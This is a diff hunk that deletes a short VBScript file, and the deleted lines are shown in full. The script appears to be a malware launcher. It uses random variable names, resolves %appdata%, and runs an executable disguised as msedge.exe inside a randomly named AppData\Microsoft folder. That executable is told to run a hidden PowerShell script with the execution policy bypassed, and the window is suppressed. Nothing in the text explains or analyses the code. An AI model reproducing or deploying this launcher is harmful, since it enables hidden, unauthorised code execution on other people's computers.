@@ -1,7 +1,0 @@
-Set ODfJnYz = CreateObject("WScript.Shell")
-DuluoFSb = ODfJnYz.ExpandEnvironmentStrings("%appdata%")
-
-QLaZSEFp = DuluoFSb + "\Microsoft\EKfKUlgJw" + "\vgSzZWic.ps1"
-bUVpRXe = DuluoFSb + "\Microsoft\EKfKUlgJw" + "\msedge.exe -executionpolicy bypass -File " + QLaZSEFp
-
-ODfJnYz.Run bUVpRXe, 0
